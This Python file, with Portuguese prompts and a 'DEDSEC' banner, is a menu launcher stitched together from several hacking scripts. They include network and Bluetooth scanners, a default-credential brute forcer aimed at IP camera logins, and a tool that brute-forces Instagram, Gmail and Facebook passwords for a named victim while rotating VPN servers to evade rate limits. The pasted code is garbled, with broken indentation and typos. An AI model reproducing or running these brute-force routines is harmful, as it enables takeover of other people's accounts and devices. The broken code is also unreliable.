import os

ascii_art = """
  
 /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
| $$__  $$| $$_____/| $$__  $$ /$$__  $$| $$_____/ /$$__  $$
| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \__/
| $$  | $$| $$$$$   | $$  | $$|  $$$$$$ | $$$$$   | $$      
| $$  | $$| $$__/   | $$  | $$ \____  $$| $$__/   | $$      
| $$  | $$| $$      | $$  | $$ /$$  \ $$| $$      | $$    $$
| $$$$$$$/| $$$$$$$$| $$$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
|_______/ |________/|_______/  \______/ |________/ \______/ 
                                                            
"""

print(ascii_art)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def script1():
    print("Executando Script 1 (FindNearDevice)")
   import os
from scapy.all import *

def get_distance(rssi):
    # Fórmula de cálculo aproximado da distância
    # Pode variar dependendo do ambiente e do dispositivo
    tx_power = -59  # Potência de transmissão do sinal em dBm
    n = 2.7  # Expoente que varia de 2 a 4 dependendo do ambiente
    return 10 ** ((tx_power - rssi) / (10 * n))

def scan_devices():
    devices = []
    print("Escaneando dispositivos na rede...")
    arp_result = os.popen("arp -a").read()

    for line in arp_result.splitlines():
        if "incomplete" not in line:
            ip, _, mac, _ = line.split()
            devices.append((ip, mac))

    return devices

def main():
    devices = scan_devices()

    for index, (ip, mac) in enumerate(devices, 1):
        print(f"Dispositivo {index}:")
        print(f"IP: {ip}")
        print(f"MAC: {mac}")
        rssi = random.randint(-90, -40)  # Simulação de um valor RSSI
        distance = get_distance(rssi)
        print(f"Distância aproximada: {distance} metros")
        print()

if __name__ == "__main__":
    main()

def script2():
    print("Executando Script 2 (Distrhacktion)")
   import bluetooth
import requests

def discover_bluetooth_devices():
    devices = bluetooth.discover_devices(duration=8, lookup_names=True)
    return devices

def send_bluetooth_message(device_address, message):
    service_uuid = "00001101-0000-1000-8000-00805F9B34FB"  # UUID do serviço Serial Port Profile (SPP)

    try:
        socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        socket.connect((device_address, 1))
        socket.send(message)
        socket.close()
        print("Mensagem enviada com sucesso!")
    except bluetooth.btcommon.BluetoothError as e:
        print(f"Erro ao enviar mensagem via Bluetooth: {e}")

def send_wifi_message(device_ip, message):
    url = f"http://{device_ip}/endpoint"  # Substitua 'endpoint' pelo endpoint adequado do dispositivo
    data = {'message': message}  # Crie um dicionário com os dados a serem enviados

    try:
        response = requests.post(url, json=data)  # Envia uma requisição POST com os dados em formato JSON
        if response.status_code == 200:
            print("Mensagem enviada com sucesso!")
        else:
            print(f"Erro ao enviar mensagem. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao enviar mensagem: {e}")

def main():
    print("Selecione o método de envio:")
    print("1. Bluetooth")
    print("2. Wi-Fi")
    choice = input("Escolha uma opção: ")

    if choice == "1":
        devices = discover_bluetooth_devices()
        if devices:
            print("Dispositivos Bluetooth encontrados:")
            for i, (device_address, device_name) in enumerate(devices):
                print(f"{i+1}. {device_name} ({device_address})")

            device_choice = int(input("Escolha um dispositivo: "))
            if device_choice > 0 and device_choice <= len(devices):
                device_address = devices[device_choice-1][0]
                message = input("Digite a mensagem a ser enviada: ")
                send_bluetooth_message(device_address, message)
            else:
                print("Opção inválida.")
        else:
            print("Nenhum dispositivo Bluetooth encontrado.")
    elif choice == "2":
        device_ip = input("Digite o endereço IP do dispositivo na rede local: ")
        message = input("Digite a mensagem a ser enviada: ")
        send_wifi_message(device_ip, message)
    else:
        print("Opção inválida.")

if __name__ == "__main__":
    main()

def script3():
    print("Executando Script 3 (ShareMe.py)")
    import os
import bluetooth

def send_file_over_bluetooth(file_path, target_device):
    # Verificar se o arquivo existe
    if not os.path.exists(file_path):
        print("Arquivo não encontrado.")
        return

    # Verificar se o dispositivo Bluetooth está disponível
    if target_device not in bluetooth.discover_devices():
        print("Dispositivo Bluetooth não encontrado.")
        return

    try:
        # Estabelecer a conexão Bluetooth
        socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        socket.connect((target_device, 1))

        # Enviar o arquivo
        with open(file_path, 'rb') as file:
            for data in file:
                socket.send(data)

        # Fechar a conexão
        socket.close()
        print("Arquivo enviado com sucesso.")

    except Exception as e:
        print("Ocorreu um erro ao enviar o arquivo:", str(e))

def list_devices():
    devices = bluetooth.discover_devices()

    print("Dispositivos Bluetooth encontrados:")
    for i, device in enumerate(devices):
        device_name = bluetooth.lookup_name(device)
        print(f"{i+1}. {device_name} ({device})")

    return devices

# Obter o caminho do arquivo
file_path = input("Digite o caminho do arquivo: ")

# Listar dispositivos Bluetooth disponíveis
devices = list_devices()

# Obter a escolha do usuário
choice = input("Digite o número do dispositivo para enviar o arquivo: ")
choice = int(choice) - 1

# Verificar se a escolha é válida
if choice < 0 or choice >= len(devices):
    print("Escolha inválida.")
    exit()

# Obter o endereço do dispositivo escolhido
target_device = devices[choice]

# Chamar a função para enviar o arquivo
send_file_over_bluetooth(file_path, target_device)

def script4():
    print("Executando Script 4 (IRSender)")
    import upnpclient
import pyIRsend

def discover_devices():
    devices = upnpclient.discover()
    return devices

def control_device(device, ir_code):
    ir_sender = pyIRsend.IRsend()
    ir_sender.send(device, ir_code)

def main():
    devices = discover_devices()

    print("Dispositivos encontrados:")
    for i, device in enumerate(devices):
        print(f"{i+1}. {device.friendly_name}")

    choice = input("Escolha o número do dispositivo: ")
    device_index = int(choice) - 1

    ir_code = input("Digite o código IR para enviar: ")

    if device_index >= 0 and device_index < len(devices):
        selected_device = devices[device_index]
        control_device(selected_device, ir_code)
        print("Comando IR enviado com sucesso!")
    else:
        print("Dispositivo selecionado inválido.")

if __name__ == "__main__":
    main()


def script5():
    print("Executando Script 5 (DEDnetSEC)")
    import pywifi
from scapy.all import ARP, Ether, srp
import requests

# Função para obter o nome do fabricante com base no MAC Address
def obter_nome_fabricante(mac):
    url = f"https://api.macvendors.com/{mac}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return "Desconhecido"

# Função para obter os dispositivos conectados na rede local
def obter_dispositivos_conectados():
    # Cria um pacote ARP
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp

    # Envia e recebe o pacote ARP
    resultado = srp(pacote, timeout=3, verbose=0)[0]

    # Lista para armazenar os dispositivos encontrados
    dispositivos = []

    # Processa os resultados
    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

# Inicializa o objeto Wifi
wifi = pywifi.PyWiFi()

# Obtém a primeira interface Wi-Fi disponível
iface = wifi.interfaces()[0]

# Ativa a interface
iface.enable()

# Obtém a lista de redes Wi-Fi disponíveis
networks = iface.scan_results()

# Imprime a lista numerada de redes
for i, network in enumerate(networks, 1):
    print(f"{i}. SSID: {network.ssid} - BSSID: {network.bssid}")

# Obtém a escolha do usuário
choice = int(input("Escolha o número da rede Wi-Fi desejada: "))

# Verifica se o número de escolha é válido
if choice < 1 or choice > len(networks):
    print("Opção inválida!")
else:
    # Obtém a rede escolhida
    chosen_network = networks[choice - 1]

    # Remove os ":" do BSSID
    bssid = chosen_network.bssid.replace(":", "")

    # Remove os dois primeiros números do BSSID
    bssid = bssid[2:]

    # Imprime as informações da rede escolhida

def script6():
    print("Executando Script 6 (BruteCam)")
   import requests

usernames = ['admin', 'root', 'Admin', 'administrador', 'service', 'Dinion', '666666', '888888', 'user1', 'administrator', 'config', 'admin1', 'adm', 'ubnt', 'ADMIN', 'supervisor']
passwords = ['12345', 'root', 'admin', '123456', '9999', '1234', 'pass', 'ce', '666666', '888888', 'camera', '11111111', 'fliradmin', '9999', 'HuaWei123', 'ChangeMe123', 'config', 'instar', '123456789system', 'jvc', '1111', 'ms1234', 'password', '4321', 'password', 'ikwd', 'ubnt', 'supervisor']

use_default = input("Deseja usar as variáveis padrão user/pass? (S/N): ")

if use_default.upper() == 'N':
    username_var = input("Digite o nome da variável de usuário: ")
    password_var = input("Digite o nome da variável de senha: ")
else:
    username_var = 'user'
    password_var = 'pass'

host = input("Digite o host alvo: ")

use_default_passwords = input("Deseja usar as senhas padrões do script? (S/N): ")

if use_default_passwords.upper() == 'N':
    password_file = input("Digite o caminho para o arquivo de senhas: ")
    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

error_message = input("Digite a mensagem de erro esperada: ")
found_message = False

for username in usernames:
    for password in passwords:
        # Faz a solicitação ao host com os campos de usuário e senha
        response = requests.post(host, data={username_var: username, password_var: password})
        
        # Verifica a resposta da solicitação
        if response.status_code == 200:
            if response.text.lower().startswith('erro'):
                print("Combinação inválida - Usuário:", username, "Senha:", password)
            else:
                print("Combinação encontrada - Usuário:", username, "Senha:", password)
                print("Resposta do servidor:", response.text)
                found_message = True
                break
        elif response.text == error_message:
            print("Combinação inválida - Usuário:", username, "Senha:", password)
        else:
            print("Erro ao fazer a solicitação - Usuário:", username, "Senha:", password)
    
    if found_message:
        break
def script7():
    print("Executando Script 7 (Osintscript)")
    import requests

def search_social_media_profiles(name):
    social_media_sites = [
        "https://www.facebook.com/{}",
        "https://www.instagram.com/{}",
        "https://www.twitter.com/{}",
        "https://www.linkedin.com/in/{}",
        "https://www.reddit.com/user/{}",
        "https://www.pinterest.com/{}",
        "https://www.telegram.me/{}",
        "https://www.tiktok.com/@{}",
        "https://www.youtube.com/{}"
    ]

    found_profiles = []

    for site in social_media_sites:
        url = site.format(name)
        response = requests.get(url)
        
        if response.status_code == 200:
            found_profiles.append(url)

    return found_profiles

# Exemplo de uso:
name = input("Digite o nome para pesquisa: ")
profiles = search_social_media_profiles(name)

if profiles:
    print("Perfis encontrados nas redes sociais:")
    for profile in profiles:
        print(profile)
else:
    print("Nenhum perfil encontrado nas redes sociais.")

def script8():
    print("Executando Script 8 (SMHT)")
    from src.smhtk import *
from src.user_agents import user_agents
import os
import random
import requests
import time
from requests import Session
import sys
import mechanize
import smtplib

codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W", "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
choiceCode = random.choice(codeList)
option_list = []

sleep_time = 4
b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                 )]

os.system("clear")
ascii()
select_an_option()
print("["+color.GREEN+"1"+color.END+"] "+color.YELLOW+"Instagram\n"+color.END+"["+color.GREEN+"2"+color.END+"] "+color.BLUE+"Facebook"+"\n"+color.END+"["+color.GREEN+"3"+color.END+"] "+color.RED+"Gmail"+color.END+"\n"+color.END+"["+color.GREEN+"4"+color.END+"] "+color.CYAN+"Twitter"+color.END)
option = input("\n> ")
if option == "1":
    option_name = "instagram"
elif option == "2":
    option_name = "facebook"
elif option == "3":
    option_name = "gmail"
elif option == "4":
    option_name = "twitter"
option_list.append(option_name)
ascii()
print(color.GREEN+"/"+option_list[0]+ "\n")
select_an_option()



        
def InstagramBruteforce():
    print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
    option = input("\n> ")
    if option == "1":
      vpn = "False"
    elif option == "2":
        vpn = "True"
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    select_an_username()
    victim = input("\n> @")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"\n"+color.END)
    select_an_wordlist()
    wl = input("\n> ")
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"/wl?"+wl+"\n"+color.END)
    if vpn == "False":
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines() 
            count = 0
        except FileNotFoundError:
            print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                password = ""
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                        'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-length': '275',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': 'bc3d5af829ea',
                'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                        'username': f'{victim}',
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                        'queryParams': '{}',
                        'optIntoOneTap': 'false'
                }    
                r = rs.post(url, headers=headers, data=data)
                if  'authenticated":true' in r.text or 'userId' in r.text:
                        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                        print("")
                        print ("["+"+"+"]"+" PASSWORD FINDED:  "+password)
                        exit()
                else:
                        print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                        time.sleep(int(sleep_time))
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                time.sleep(1)
    if vpn == "True":
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines() 
            count = 0
        except FileNotFoundError:
            print(+"ERROR 0x1: "+wl+" file not found, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                password = ""
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                        'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-length': '275',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': 'bc3d5af829ea',
                'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                        'username': f'{username}',
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                        'queryParams': '{}',
                        'optIntoOneTap': 'false'
                }    
                r = rs.post(url, headers=headers, data=data)
                if  'authenticated":true' in r.text or 'userId' in r.text:
                        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                        print("")
                        print ("["+"+"+"]"+" PASSWORD FINDED  "+password)
                        exit()
                else:
                        print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                        time.sleep(int(sleep_time))
                        os.system("\nwindscribe connect " + choiceCode)
                        time.sleep(2)
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                time.sleep(1)
                os.system("\nwindscribe connect " + choiceCode)
                
    if vpn == "False":
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines() 
            count = 0
        except FileNotFoundError:
            print(+"ERROR 0x1: "+wl+" file not found, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                password = ""
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                        'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-length': '275',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': 'bc3d5af829ea',
                'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                        'username': f'{username}',
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                        'queryParams': '{}',
                        'optIntoOneTap': 'false'
                }    
                r = rs.post(url, headers=headers, data=data)
                if  'authenticated":true' in r.text or 'userId' in r.text:
                        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                        print("")
                        print ("["+"+"+"]"+" PASSWORD FINDED  "+password)
                        exit()
                else:
                        print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                        time.sleep(int(sleep_time))
                        time.sleep(2)
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                time.spleep(1)
if option == "1":
    InstagramChoiche()
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    if option == "1":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_option()
        InstagramBruteforce()
    if option == "2":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_username()
        username = input("\n> @")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"\n"+color.END)
        select_an_amount()
        amount = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"amount?"+amount+"\n"+color.END)
        report_profile_attack(username, int(amount))
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    if option == "3":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_option()
        InstagramBruteforce()
if option == "3":
    clear()
    ascii()
    GmailC()
    option = input("> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+"toselect"+"\n"+color.END)
    select_an_option()
    print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
    index = 10
    option = input("\n> ")
    print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
    if option == "1":
        vpn = "False"
    elif option == "2":
        vpn = "True"
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    select_an_email()
    username = input("\n> ")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"\n"+color.END)
    select_an_wordlist()
    wl = input("\n> ")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"amount?"+"noamount"+"\n"+color.END)
    try:
        with open(wl, 'r') as f:
            Lines = f.readlines() 
        count = 0
    except FileNotFoundError:
        print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
        exit()
    if option == "1":
        for password in Lines:
            try:
                session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
                session.starttls() #enable security
                session.login(username, password) #logi
                print("["+color.GREEN+"-"+color.END+"]"+color.GEEN+"Password: "+color.END+password)
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                if vpn == "True":
                    os.system("\nwindscribe connect " + choiceCode)
        
if option == "2":
    FacebookChoiche()
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    if option == "1":

        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+"toselect"+"\n"+color.END)
        select_an_option()
        print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
        index = 10
        option = input("\n> ")
        print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
        if option == "1":
            vpn = "False"
        elif option == "2":
            vpn = "True"
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_usernamefb()

        victim = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"\n"+color.END)
        select_an_wordlist()
        wl = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"/wl?"+wl+"\n"+color.END)
        if vpn == "False":
            try:
                file1 = open(wl, 'r')
                Lines = file1.readlines() 
                count = 0
            except FileNotFoundError:
                print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
                exit()
            for passw in Lines:
                is_this_a_password(victim, index, passw)
        elif vpn == "True":
            try:
                file1 = open(wl, 'r')
                Lines = file1.readlines() 
                count = 0
            except FileNotFoundError:
                print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
                exit()
            for passw in Lines:
                is_this_a_password(victim, index, passw)
                if vpn == "True":
                    os.system("\nwindscribe connect " + choiceCode)            

if option == "4":
    TwitterCoiche()
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")

    if option == "1":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_option()
        print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
        vpn = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_usernamefb()
        victim = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"\n"+color.END)
        select_an_wordlist()
        wl = input("\n> ")
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines()
        except Exception:
                print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
                exit()
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"/wl?"+wl+"\n"+color.END)
        for password in Lines:
            if vpn == "1":
                twitter(password, victim)
            if vpn == "2":
                os.system("\nwindscribe connect " + choiceCode)
                twitter(password, victim)

def main():
    while True:
        clear_screen()
        print("Escolha uma opção:")
        print("1. Executar FindNearDevice")
        print("2. Executar Distrhacktion")
        print("3. Executar ShareMe.py")
        print("4. Executar IRSender")
        print("5. Executar DEDnetSEC")
        print("6. Executar BruteCam")
        print("7. Executar Osintscript")
        print("8. Executar SMHT")
        print("0. Sair")

        choice = input("Digite o número da opção desejada: ")

        if choice == "1":
            script1()
        elif choice == "2":
            script2()
        elif choice == "3":
            script3()
        elif choice == "4":
            script4()
        elif choice == "5":
            script5()
        elif choice == "6":
            script6()
        elif choice == "7":
            script7()
        elif choice == "8":
            script8()
        elif choice == "0":
            break
        else:
            print("Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()
